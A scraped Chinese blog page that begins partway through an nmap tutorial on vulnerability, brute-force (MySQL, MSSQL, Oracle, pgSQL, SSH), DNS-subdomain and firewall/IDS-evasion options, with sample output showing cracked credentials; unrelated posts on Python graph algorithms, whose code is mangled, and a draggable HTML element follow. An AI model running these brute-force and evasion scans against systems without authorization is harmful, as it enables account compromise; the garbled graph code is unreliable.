负责增强服务与版本扫描Version Detection功能的脚本 - vuln: 负责检查目标机是否有常见的漏洞Vulnerability如是否有MS08_067 使用具体脚本进行扫描 nmap –script 具体的脚本 <a href="http://www.baidu.com">www.baidu.com</a> 常用脚本使用案例 扫描服务器的常见漏洞 nmap –script vuln 检查FTP是否开启匿名登陆 nmap –script ftp-anon PORT STATE SERVICE 21/tcp open ftp | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-r–r– 1 1170 924 31 Mar 28 2001 .banner | d–x–x–x 2 root root 1024 Jan 14 2002 bin | d–x–x–x 2 root root 1024 Aug 10 1999 etc | drwxr-srwt 2 1170 924 2048 Jul 19 18:48 incoming [NSE: writeable] | d–x–x–x 2 root root 1024 Jan 14 2002 lib | drwxr-sr-x 2 1170 924 1024 Aug 5 2004 pub |_Only 6 shown. Use –script-args ftp-anon.maxlist=-1 to see all. 对MySQL进行暴破解 nmap –script=mysql-brute 3306/tcp open mysql | mysql-brute: | Accounts | root:root - Valid credentials 一款强大的安全扫描器nmap：不老的神器 可以看出已经暴力成功破解了MySQL,在368秒内进行45061次猜测平均TPS为146.5。 对MsSQL进行暴破解 nmap -p 1433 –script ms-sql-brute –script-args userdb=customuser.txt,passdb=custompass.txt | ms-sql-brute: | [192.168.100.128\TEST] | No credentials found | Warnings: | sa: AccountLockedOut | [192.168.100.128\PROD] | Credentials found: | webshop_reader:secret =&gt; Login Success | testuser:secret1234 =&gt; PasswordMustChange |_ lordvader:secret1234 =&gt; Login Success 对Oracle数据库进行暴破解 nmap –script oracle-brute -p 1521 –script-args oracle-brute.sid=ORCL PORT STATE SERVICE REASON 1521/tcp open oracle syn-ack | oracle-brute: | Accounts | system:powell =&gt; Account locked | haxxor:haxxor =&gt; Valid credentials | Statistics |_ Perfomed 157 guesses in 8 seconds, average tps: 19 对pgSQL的暴力破解 nmap -p 5432 –script pgsql-brute 5432/tcp open pgsql | pgsql-brute: | root: => Valid credentials |_ test:test =&gt; Valid credentials 对SSH进行暴力破解 nmap -p 22 –script ssh-brute –script-args userdb=users.lst,passdb=pass.lst –script-args ssh-brute.timeout=4s 22/ssh open ssh | ssh-brute: | Accounts | username:password | Statistics |_ Performed 32 guesses in 25 seconds. 利用DNS进行子域名暴力破解 nmap –script dns-brute <a href="http://www.baidu.com">www.baidu.com</a> λ nmap –script dns-brute <a href="http://www.baidu.com">www.baidu.com</a> Starting Nmap 7.50 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-07-25 13:12 ? Nmap scan report for <a href="http://www.baidu.com">www.baidu.com</a> (180.97.33.108) Host is up (0.018s latency). Other addresses for <a href="http://www.baidu.com">www.baidu.com</a> (not scanned): 180.97.33.10 Not shown: 998 filtered ports PORT STATE SERVICE 80/tcp open http 443/tcp open https Host script results: | dns-brute: | DNS Brute-force hostnames: | admin.baidu.com - 10.26.109.19 | mx.baidu.com - 61.135.163.61 | svn.baidu.com - 10.65.211.174 | ads.baidu.com - 10.42.4.225 Nmap done: 1 IP address (1 host up) scanned in 92.64 seconds 一款强大的安全扫描器nmap：不老的神器 额(⊙⊙) 这个admin.baidu.com后面那个10.26.109.19难道真的是百度内网的管理平台地址 检查VMWare ESXESXi和服务器CVE-2009-3733中的路径遍历漏洞 nmap –script http-vmware-path-vuln -p80,443,8222,8333 | http-vmware-path-vuln: | VMWare path traversal (CVE-2009-3733): VULNERABLE | /vmware/Windows 2003/Windows 2003.vmx | /vmware/Pentest/Pentest - Linux/Linux Pentest Bravo.vmx | /vmware/Pentest/Pentest - Windows/Windows 2003.vmx | /mnt/vmware/vmware/FreeBSD 7.2/FreeBSD 7.2.vmx | /mnt/vmware/vmware/FreeBSD 8.0/FreeBSD 8.0.vmx | /mnt/vmware/vmware/FreeBSD 8.0 64-bit/FreeBSD 8.0 64-bit.vmx |_ /mnt/vmware/vmware/Slackware 13 32-bit/Slackware 13 32-bit.vmx 查询VMware服务器vCenterESXESXiSOAP API以提取版本信息。 λ nmap –script vmware-version -p443 10.0.1.4 Starting Nmap 7.50 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-07-25 12:26 ?D1ú±ê×?ê±?? Nmap scan report for 10.0.1.4 Host is up (0.0019s latency). PORT STATE SERVICE 443/tcp open https | vmware-version: | Server version: VMware ESXi 6.5.0 | Build: 4887370 | Locale version: INTL 000 | OS type: vmnix-x86 |_ Product Line ID: embeddedEsx Service Info: CPE: cpe:/o:vmware:ESXi:6.5.0 Nmap done: 1 IP address (1 host up) scanned in 6.28 seconds 一款强大的安全扫描器nmap：不老的神器 参数详解 Nmap支持主机名,ip,网段的表示方式例如:blah.highon.coffee, namp.org/24, 192.168.0.1;10.0.0-25.1-254 -iL filename 从文件中读取待检测的目标,文件中的表示方法支持机名,ip,网段 -iR hostnum 随机选取,进行扫描.如果-iR指定为0,则是无休止的扫描 –exclude host1[, host2] 从扫描任务中需要排除的主机 –exculdefile exclude_file 排除文件中的IP,格式和-iL指定扫描文件的格式相同 主机发现 -sL 仅仅是显示,扫描的IP数目,不会进行任何扫描 -sn ping扫描,即主机发现 -Pn 不检测主机存活 -PS/PA/PU/PY[portlist] TCP SYN Ping/TCP ACK Ping/UDP Ping发现 -PE/PP/PM 使用ICMP echo, timestamp and netmask 请求包发现主机 -PO[prococol list] 使用IP协议包探测对方主机是否开启 -n/-R 不对IP进行域名反向解析/为所有的IP都进行域名的反响解析 扫描技巧 -sS/sT/sA/sW/sM TCP SYN/TCP connect()/ACK/TCP窗口扫描/TCP Maimon扫描 -sU UDP扫描 -sN/sF/sX TCP NullFINand Xmas扫描 –scanflags 自定义TCP包中的flags -sI zombie host[:probeport] Idlescan -sY/sZ SCTP INIT/COOKIE-ECHO 扫描 -sO 使用IP protocol 扫描确定目标机支持的协议类型 -b “FTP relay host” 使用FTP bounce scan 指定端口和扫描顺序 -p 特定的端口 -p80,443 或者 -p1-65535 -p U:PORT 扫描udp的某个端口, -p U:53 -F 快速扫描模式,比默认的扫描端口还少 -r 不随机扫描端口,默认是随机扫描的 –top-ports “number” 扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于/usr/share/nmap.nmap默认扫前1000个 –port-ratio “ratio” 扫描指定频率以上的端口 服务版本识别 -sV 开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测 –version-intensity “level” 设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高服务越有可能被正确识别。默认是7 –version-light 打开轻量级模式,为–version-intensity 2的别名 –version-all 尝试所有探测,为–version-intensity 9的别名 –version-trace 显示出详细的版本侦测过程信息 脚本扫描 -sC 根据端口识别的服务,调用默认脚本 –script=”Lua scripts” 调用的脚本名 –script-args=n1=v1,[n2=v2] 调用的脚本传递的参数 –script-args-file=filename 使用文本传递参数 –script-trace 显示所有发送和接收到的数据 –script-updatedb 更新脚本的数据库 –script-help=”Lua script” 显示指定脚本的帮助 OS识别 -O 启用操作系统检测,-A来同时启用操作系统检测和版本检测 –osscan-limit 针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口) –osscan-guess 推测操作系统检测结果,当Nmap无法确定所检测的操作系统时会尽可能地提供最相近的匹配Nmap默认进行这种匹配 防火墙/IDS躲避和哄骗 -f; –mtu value 指定使用分片、指定数据包的MTU. -D decoy1,decoy2,ME 使用诱饵隐蔽扫描 -S IP-ADDRESS 源地址欺骗 -e interface 使用指定的接口 -g/ –source-port PROTNUM 使用指定源端口 –proxies url1,[url2],… 使用HTTP或者SOCKS4的代理 –data-length NUM 填充随机数据让数据包长度达到NUM –ip-options OPTIONS 使用指定的IP选项来发送数据包 –ttl VALUE 设置IP time-to-live域 –spoof-mac ADDR/PREFIX/VEBDOR MAC地址伪装 –badsum 使用错误的checksum来发送数据包 Nmap 输出 -oN 将标准输出直接写入指定的文件 -oX 输出xml文件 -oS 将所有的输出都改为大写 -oG 输出便于通过bash或者perl处理的格式,非xml -oA BASENAME 可将扫描结果以标准格式、XML格式和Grep格式一次性输出 -v 提高输出信息的详细度 -d level 设置debug级别,最高是9 –reason 显示端口处于带确认状态的原因 –open 只输出端口状态为open的端口 –packet-trace 显示所有发送或者接收到的数据包 –iflist 显示路由信息和接口,便于调试 –log-errors 把日志等级为errors/warings的日志输出 –append-output 追加到指定的文件 –resume FILENAME 恢复已停止的扫描 –stylesheet PATH/URL 设置XSL样式表转换XML输出 –webxml 从namp.org得到XML的样式 –no-sytlesheet 忽略XML声明的XSL样式表 其他nmap选项 -6 开启IPv6 -A OS识别,版本探测,脚本扫描和traceroute –datedir DIRNAME 说明用户Nmap数据文件位置 –send-eth / –send-ip 使用原以太网帧发送/在原IP层发送 –privileged 假定用户具有全部权限 –unprovoleged 假定用户不具有全部权限,创建原始套接字需要root权限 -V 打印版本信息 -h 输出帮助</0-5></p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/pygraphalgorithm/index.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/pygraphalgorithm/index.html" itemprop="url">
                  python实现图算法
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-06-12 17:09:20" itemprop="dateCreated datePublished" datetime="2017-06-12T17:09:20+08:00">2017-06-12</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/技术学习/" itemprop="url" rel="index"><span itemprop="name">技术学习</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>本文为图算法的python实现。<a href="https://github.com/imagemlt/PyGraphAlgorithm">github</a></p>
<p>#!/usr/bin/env python </p>
<p>#coding=utf-8</p>
<p>def getWeight(V,E,u,v):<br>    if E.has_key(u):<br>        for i in E[u]:<br>            if i[1] is v:<br>                return i[2]<br>    return 100000</p>
<p>def BFS(V,E,start):<br>    color=[-1]<em>len(V)<br>    depth=[0]</em>len(V)<br>    queue=[]<br>    queue.append(start)<br>    color[start]=0<br>    while len(queue)&gt;0:<br>        p=queue.pop(0)<br>        print “ “*depth[p],<br>        print V[p]<br>        if E.has_key(V[p]):<br>            for j in E[V[p]]:<br>                if color[V.index(j[1])]==-1:<br>                    queue.append(V.index(j[1]))<br>                    depth[V.index(j[1])]=depth[p]+1<br>                    color[V.index(j[1])]=0<br>        color[p]=1<br>    return depth</p>
<p>time=0</p>
<p>def DFS_start(V,E):<br>        global time<br>    color=[-1]<em>len(V)<br>    startTime=[0]</em>len(V)<br>        finishTime=[0]*len(V)<br>    for i in V:<br>        if color[V.index(i)]==-1:<br>            DFS(V,E,color,startTime,finishTime,i)<br>    return startTime,finishTime</p>
<p>def DFS(V,E,color,startTime,finishTime,i):<br>        global time<br>        time=time+1<br>    startTime[V.index(i)]=time<br>    print “ “*startTime[V.index(i)],<br>    print i<br>    color[V.index(i)]=0<br>    if E.has_key(i):<br>        for m in E[i]:<br>            if color[V.index(m[1])]==-1:<br>                DFS(V,E,color,startTime,finishTime,m[1])<br>    color[i]=1<br>        time=time+1<br>        finishTime[V.index(i)]=time</p>
<p>def TopologicalSort(V,E):<br>    indegree=[0]*len(V)<br>    visited=[]<br>    for i in E:<br>        for j in E[i]:<br>            indegree[V.index(j[1])]=indegree[V.index(j[1])]+1<br>    while 0 in indegree:<br>            pos=indegree.index(0)<br>            visited.append(V[pos])<br>            if E.has_key(V[pos]):<br>                for j in E[V[pos]]:<br>                    indegree[j[1]]=indegree[j[1]]-1<br>            indegree[pos]=-1<br>    if len(visited)0:<br>                current=Queue.pop(0)<br>                flag=False<br>                if E.has_key(V[current]):<br>                    for i in E[V[current]]:<br>                        if color[V.index(i[1])] is not 1:<br>                            flag=True<br>                            if color[V.index(i[1])] is not -1:<br>                                Queue.append(V.index(i[1]))<br>                                color[V.index(i[1])]=-1<br>                            break<br>                if not flag:<br>                    visited.insert(0,V[current])<br>                    color[current]=1<br>                else:<br>                    Queue.append(V[current])<br>                    color[current]=-1<br>    return visited</p>
<p>def Kruskal(V,E):<br>    visited=[]<br>    visitedpoints=[]<br>    notvisited=[]<br>    for m in E:<br>        for n in E[m]:<br>            notvisited.append(n)<br>    while len(visited)0:<br>        temp=(0,0,65535)<br>        for j in notvisited:<br>            if j[2]0:<br>        temp=(0,0,65535)<br>        for j in notvisited:<br>            flag=False<br>            if len(visited)==0:<br>                flag=True<br>            n=visitedpoints.count(j[0])+visitedpoints.count(j[1])<br>            if n==1:<br>                flag=True<br>            if j[2]0:<br>            if E.has_key(int(m)):<br>                E[int(m)].append((int(m),int(n),int(s)))<br>            else:<br>                E[int(m)]=[]<br>                E[int(m)].append((int(m),int(n),int(s)))<br>        b=raw_input()<br>    print “\nthe graph you inputed is:”<br>    print V<br>    print E<br>    print “\nBellman_Ford:”<br>    path,length=Bellman_Ford(V,E,0)<br>    for i in range(0,len(V)):<br>        p=[]<br>        t=i<br>        print str(t)+”:”,<br>        while t is not 0:<br>            p.append(V[t])<br>            t=path[t]<br>        print 0,<br>        while len(p)&gt;0:<br>            print p.pop(),<br>        print “\t”+str(length[i])<br>    print “\nFloyd:”<br>    print Floyd(V,E)<br>    print “\nBFS:”<br>    BFS(V,E,0)<br>    print “\nDFS:”<br>    firstTime,lastTime=DFS_start(V,E)<br>        for i in range(0,len(V)):<br>            print “%d,%4d,%4d”%(V[i],firstTime[i],lastTime[i])<br>        print “ToplogicalSort:”<br>        ans=TopologicalSort(V,E)<br>        print ans<br>        if len(ans)&gt;0:<br>            print “TopologicalSort:dfs”<br>            print TopologicalSort_dfs(V,E)</p>
<pre><code>    print &quot;\\nPrim:&quot;
print Prim(V,E)
print &quot;\\nKruskal:&quot;
print Kruskal(V,E)
</code></pre><p>if __name__==”__main__“:<br>main()</p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/html-simple-draggable/index.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/html-simple-draggable/index.html" itemprop="url">
                  html简易可拖动元素实现
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-06-12 10:52:00" itemprop="dateCreated datePublished" datetime="2017-06-12T10:52:00+08:00">2017-06-12</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/技术学习/" itemprop="url" rel="index"><span itemprop="name">技术学习</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p> html{<br>        width:100%;<br>        height:100%;<br>    }<br>    body{<br>        width:70%;<br>        height:100%;<br>        margin:0 auto;<br>        border:2px solid #000;<br>    }<br>        .dialogue{<br>        position:fixed;<br>        width:80px;<br>        height:80px;<br>        background-color:aqua;<br>        top:50%;<br>        left:48%;<br>        border-radius:10px;<br>        text-align:left;<br>    }<br>    .head{<br>        display:inline-block;<br>        border:5px solid antiquewhite;<br>        height:20px;<br>        width:67%;<br>        font-size:15px;<br>        line-height:20px;<br>        margin:0 0;<br>        background-color:azure;<br>        border-radius:5px 0 0 0;<br>        -moz-user-select:none;<br>        -webkit-user-select:none;<br>    }<br>    input{<br>        display:inline-block;<br>        width:20%;float:right;<br>        text-align:left;<br>        height:30px;<br>        border:0px;<br>        line-height:30px;<br>        background-color:antiquewhite;<br>        border-radius:0 5px 0 0;<br>    }<br>无标题文档</p>
<p>xinxi:</p>
<p> var posx_begin,posy_begin;<br>    var start=false;<br>    document.getElementById(“head”).addEventListener(“mousedown”,function(event){<br>        posx_begin=event.offsetX;<br>        posy_begin=event.offsetY;<br>        start=true;<br>    });<br>    document.getElementById(“head”).addEventListener(“mousemove”,function(event){<br>        if(start){<br>        document.getElementById(“dia”).style.top=event.offsetY-posy_begin+parseInt(window.getComputedStyle(document.getElementById(“dia”))[‘top’].slice(0,-2))+”px”;<br>        document.getElementById(“dia”).style.left=event.offsetX-posx_begin+parseInt(window.getComputedStyle(document.getElementById(“dia”))[‘left’].slice(0,-2))+”px”;<br>        }<br>    });<br>    document.getElementById(“head”).onmouseup=document.getElementById(“head”).onmouseout=function(event){<br>        if(start){<br>        start=false;<br>        }<br>    }</p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4" alt="Imagemlt">
            
              <p class="site-author-name" itemprop="name">Imagemlt</p>
              <p class="site-description motion-element" itemprop="description">personal blog</p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">57</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  <a href="/categories/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">15</span>
                    <span class="site-state-item-name">categories</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  <a href="/tags/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">11</span>
                    <span class="site-state-item-name">tags</span>
                  </a>
                </div>
              
            </nav>
          

          

          
            <div class="links-of-author motion-element">
              
                <span class="links-of-author-item">
                  <a href="https://github.com/imagemlt" target="_blank" title="GitHub" rel="external nofollow"><i class="fa fa-fw fa-github"></i>GitHub</a>
                  
                </span>
              
            </div>
          

          
          

          
          

          
            
          
          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Imagemlt</span>

  

  
</div>


  



  <div class="powered-by">Powered by <a class="theme-link" target="_blank" rel="external nofollow" href="https://hexo.io">Hexo</a> v3.8.0</div>



  <span class="post-meta-divider">|</span>

Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>

  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" rel="external nofollow" href="https://github.com/theme-next/hexo-theme-next">NexT.Pisces</a> v6.3.0</div>




  <script src="https://unpkg.com/mermaid@7.1.2/dist/mermaid.min.js"></script>
  <script>
    if (window.mermaid) {
//alert("mermaid!!!");
      mermaid.initialize({theme: 'forest'});
    }
  </script>


        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>



  



	





  





  










  





  

  

  

  

  
  

  

  

  

  

  

</body>
</html>
